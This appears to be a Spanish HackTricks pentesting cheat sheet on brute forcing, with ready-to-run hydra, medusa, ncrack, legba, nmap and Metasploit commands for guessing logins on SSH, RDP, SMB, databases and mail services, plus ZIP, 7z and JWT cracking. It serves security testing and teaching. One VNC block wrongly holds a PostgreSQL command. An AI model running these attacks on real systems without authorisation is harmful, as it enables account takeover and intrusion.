# Fuerza Bruta - Hoja de Trucos

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
¡Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credenciales Predeterminadas

**Busca en Google** las credenciales predeterminadas de la tecnología que se está utilizando, o **prueba estos enlaces**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Crea tus propios Diccionarios**

Encuentra toda la información posible sobre el objetivo y genera un diccionario personalizado. Herramientas que pueden ayudar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl es una herramienta que se utiliza para generar listas de palabras clave a partir de un sitio web. Esto puede ser útil para realizar ataques de fuerza bruta o para crear listas de posibles contraseñas.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera contraseñas basadas en tu conocimiento sobre la víctima (nombres, fechas...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Una herramienta generadora de listas de palabras, que te permite suministrar un conjunto de palabras, dándote la posibilidad de crear múltiples variaciones a partir de las palabras dadas, creando una lista de palabras única e ideal para usar en relación a un objetivo específico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palabras

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servicios

Ordenados alfabéticamente por nombre de servicio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB es una base de datos NoSQL que se puede atacar mediante fuerza bruta para intentar adivinar credenciales débiles.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro de Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Fuerza bruta

La fuerza bruta es un método comúnmente utilizado para descifrar contraseñas y encontrar información sensible al probar todas las combinaciones posibles de caracteres. En el contexto de Elasticsearch, la fuerza bruta puede ser utilizada para intentar adivinar credenciales de acceso o para encontrar documentos sensibles al probar diferentes consultas de búsqueda. Es importante implementar medidas de seguridad sólidas, como contraseñas seguras y limitaciones en los intentos de inicio de sesión, para protegerse contra ataques de fuerza bruta.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

### FTP
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Fuerza Bruta Genérica HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticación Básica HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Enviar formulario
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Para http**s** debes cambiar de "http-post-form" a "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

#### Brute Force

Brute force attacks against IMAP are typically carried out using the `hydra` tool. The following command can be used to launch a brute force attack against an IMAP server:

```bash
hydra -l <username> -P <wordlist> -f <target_ip> imap
```

- `-l`: Specify the username to attack.
- `-P`: Specify the wordlist containing passwords to try.
- `-f`: Stop the attack once the correct password is found.
- `imap`: Specify the protocol to attack.

It is important to note that brute force attacks can be detected by intrusion detection systems (IDS) and can lead to account lockouts.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

#### Fuerza bruta

La fuerza bruta en IRC implica intentar adivinar nombres de canales y mensajes privados. Los scripts de fuerza bruta pueden automatizar este proceso, intentando diferentes combinaciones de nombres de canales y mensajes privados para encontrar canales activos o usuarios específicos.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Tokens) son un estándar abierto (RFC 7519) que define un formato compacto y autónomo para transmitir de forma segura la información entre dos partes como un objeto JSON. Esta información puede ser verificada y confiable debido a que está firmada digitalmente. Los JWT constan de tres partes separadas por puntos: la cabecera, la carga útil y la firma.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) es un protocolo de mensajería ligero diseñado para dispositivos con ancho de banda limitado o conexiones inestables.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

#### Fuerza bruta

La fuerza bruta es un método comúnmente utilizado para obtener credenciales de inicio de sesión de bases de datos MSSQL. Se pueden utilizar herramientas como Hydra, Ncrack o incluso un script personalizado para realizar ataques de fuerza bruta contra servidores MSSQL.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

#### Fuerza bruta

La fuerza bruta es un método comúnmente utilizado para descifrar contraseñas de bases de datos MySQL. Consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Herramientas como Hydra y Medusa son populares para llevar a cabo ataques de fuerza bruta en MySQL. Es importante tener en cuenta que el uso de la fuerza bruta puede ser detectado por sistemas de seguridad y resultar en bloqueos de cuentas o direcciones IP.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

#### Fuerza bruta

La fuerza bruta es un método comúnmente utilizado para descifrar contraseñas. Consiste en probar sistemáticamente todas las posibles combinaciones de contraseñas hasta encontrar la correcta. En el contexto de OracleSQL, esto implica probar diferentes combinaciones de contraseñas para intentar acceder a una base de datos protegida. Este método puede ser efectivo, pero puede llevar mucho tiempo dependiendo de la complejidad de la contraseña.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Para usar **oracle\_login** con **patator** necesitas **instalar**:
```bash
pip3 install cx_Oracle --upgrade
```
[Ataque de fuerza bruta de hash de OracleSQL sin conexión](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versiones 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** y **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

#### Fuerza bruta

La técnica de fuerza bruta implica probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Puede ser efectiva pero es muy lenta y puede resultar en bloqueos de cuentas debido a múltiples intentos fallidos.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Fuerza bruta

La fuerza bruta es un método comúnmente utilizado para descifrar contraseñas mediante la prueba de todas las combinaciones posibles de caracteres. En el contexto de PostgreSQL, la fuerza bruta se puede utilizar para intentar adivinar las credenciales de inicio de sesión de un usuario con el fin de obtener acceso no autorizado a la base de datos. Es importante implementar medidas de seguridad sólidas, como contraseñas fuertes y políticas de bloqueo de cuentas, para protegerse contra los ataques de fuerza bruta.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Puedes descargar el paquete `.deb` para instalar desde [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

### Rexec
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin es un protocolo de red que permite a un usuario iniciar sesión en otro host a través de una red. Es vulnerable a ataques de fuerza bruta debido a su falta de medidas de seguridad, lo que permite a los atacantes intentar múltiples combinaciones de contraseñas para obtener acceso no autorizado.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

#### Brute Force

##### Description

Rsh is a remote shell program that allows users to execute commands on a remote system. Brute forcing Rsh involves attempting to guess the password by trying all possible combinations until the correct one is found.

##### Methodology

1. **Identify Rsh Service**: Use port scanning tools like Nmap to identify systems running the Rsh service.

2. **Brute Force Tool**: Utilize tools like Hydra or Medusa to perform brute force attacks against the Rsh service. These tools allow for the automation of password guessing by trying various combinations efficiently.

3. **Wordlist**: Prepare a wordlist containing possible passwords to use with the brute force tool. Wordlists can be obtained from various sources or generated based on common password patterns.

4. **Launch Brute Force Attack**: Execute the brute force tool with the identified Rsh service, specifying the wordlist to use for password guessing. Monitor the tool for progress and successful password identification.

5. **Post-Exploitation**: Once the password is identified, post-exploitation activities can be performed, such as gaining unauthorized access to the remote system.

##### Prevention

- **Disable Rsh**: If not required, disable the Rsh service on systems to prevent brute force attacks.
  
- **Strong Passwords**: Enforce the use of strong, complex passwords to make brute force attacks more difficult.
  
- **Network Segmentation**: Implement network segmentation to restrict access to critical systems and services, reducing the attack surface for brute force attempts.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

El Protocolo Simple de Administración de Red (SNMP, por sus siglas en inglés) es un protocolo estándar de la industria para la administración de dispositivos de red.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) es un protocolo de red que permite a un cliente detrás de un firewall obtener acceso a la red a través de un servidor proxy. El protocolo SOCKS opera en la capa 5 del modelo OSI (la capa de sesión), lo que le permite manejar diferentes tipos de solicitudes de red, incluidas las conexiones TCP y UDP. El uso de SOCKS es común en situaciones donde se necesita anonimato y en eludir restricciones geográficas en internet.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

#### Brute Force

Brute force attacks against SQL Server involve attempting to guess usernames and passwords to gain unauthorized access. This can be done using automated tools that systematically try different combinations until the correct one is found. It is important to use strong, complex passwords and implement account lockout policies to prevent successful brute force attacks.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) es un protocolo de red que permite a los usuarios acceder y administrar de forma segura un servidor remoto. Se puede utilizar la técnica de fuerza bruta para intentar adivinar las credenciales de inicio de sesión de un servidor SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Claves SSH débiles / PRNG predecible de Debian

Algunos sistemas tienen fallos conocidos en la semilla aleatoria utilizada para generar material criptográfico. Esto puede resultar en un espacio de claves dramáticamente reducido que puede ser descifrado mediante herramientas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Conjuntos pregenerados de claves débiles también están disponibles, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ y OpenMQ)

El protocolo de texto STOMP es un protocolo de mensajería ampliamente utilizado que **permite una comunicación e interacción fluidas con servicios populares de encolado de mensajes** como RabbitMQ, ActiveMQ, HornetQ y OpenMQ. Proporciona un enfoque estandarizado y eficiente para intercambiar mensajes y realizar diversas operaciones de mensajería.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet es un protocolo de red que permite a los usuarios comunicarse con un servidor remoto a través de la red. Se utiliza comúnmente en pruebas de penetración para intentar iniciar sesión en un sistema remoto mediante fuerza bruta.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de datos de cracking en línea

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 y SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/sin ESS/SSP y con cualquier valor de desafío)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 y archivos MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes y hashes de archivos)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Revise esto antes de intentar hacer un ataque de fuerza bruta a un Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Ataque de fuerza bruta de texto plano conocido en archivos zip

Necesitas conocer el **texto plano** (o parte del texto plano) **de un archivo contenido dentro** del zip encriptado. Puedes verificar **los nombres de archivo y el tamaño de los archivos contenidos dentro** de un zip encriptado ejecutando: **`7z l encrypted.zip`**\
Descarga [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) desde la página de versiones.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

#### Fuerza bruta

